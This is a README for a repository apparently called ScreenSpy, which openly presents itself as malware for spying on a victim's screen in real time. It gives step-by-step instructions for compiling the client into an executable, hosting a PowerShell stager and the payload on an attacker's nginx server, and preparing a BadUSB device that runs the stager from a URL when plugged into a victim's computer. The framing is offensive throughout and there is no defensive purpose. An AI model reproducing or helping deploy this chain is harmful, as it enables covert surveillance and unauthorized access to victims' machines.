### Intro

We need three machine in order to run this attack:

- **Server** ->  This is our server machine that setup all the work and listens incoming connection from victim
- **Builder** -> This is our builder machine to compile our *client.py* to executable file. We need exact same operation system as victim use **windows** machine to compile that script to windows machine or use **linux** to compile that script for linux(x11) machines
- **Victim** ->  This is our Victim machine which we will infect and capture screen real time. 

ScreenSpy is a repository that contains followings:
   -   client.py - malware that connect to server to share its screen real time
   -   server.py - server waiting for incoming connection.
   -   screenshareStage.ino - arduino code to prepare stager BadUsb
   -   stager.ps1 - stager powershell script that badusb runs from url
   -   prepare.sh - prepares server.
   -   client.exe - compiler version of client.py 
   -   nginx.conf - nginx web server config

NOTE!: This program tested on Windows10, Linux(X11) and there no guarantee that will work for other OSs.

#### Compile python scrip to executable
In order to compile *client.py* script for linux(X11) or Windows:
```bash
git clone https://github.com/Cyb3rCr0wCC/ScreenSpy
cd ScreenSpy
pip3 install pyinstaller
pyinstaller ./client.py --onefile
```

After running above commands you will get folder named *dist*, this contian our executable.

Copy your compiled executable to your **Server** work folder where all that repo cloned.

``````bash
git clone https://github.com/Cyb3rCr0wCC/ScreenSpy
cd ScreenSpy
### Copy compiled client.py to there
``````

#### Prepare the Server

There are two options you can prepare your **Server** for this attack

Automated:

``````bash
bash prepare.sh	
``````

Manual (root):

``````bash
# Install required packages
apt install nginx python3 python3-venv python3-pil
# You dont need following three steps if you installed python3-pil via apt
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt

# Copy our stager.ps1 powershell script to our webroot that will served via nginx to install our client.exe or client malware into victims machine
cp stager.ps1 /var/www/html

# Copy compiled client.py to webroot 2>/dev/null means ignore file not exist error 
cp client.exe /var/www/html 2>/dev/null
cp client     /var/www/html 2>/dev/null

# Copy nginx.conf webserver config
cp nginx.conf /etc/nginx/conf.d/screenspy.conf

# Restart webserver and we will ready to go
systemctl restart nginx
``````



#### Prepare BadUsb

Last step is preparing our BadUsb that will do all the job when plugged into victim's computer. 

I used Arduino as a Ide to compile and upload *scrennshareStager.ino* code into our BadUsb.

I used Atmega32U4  as my BadUsb.

You can download arduino release from this: [arduino](https://www.arduino.cc/en/software)

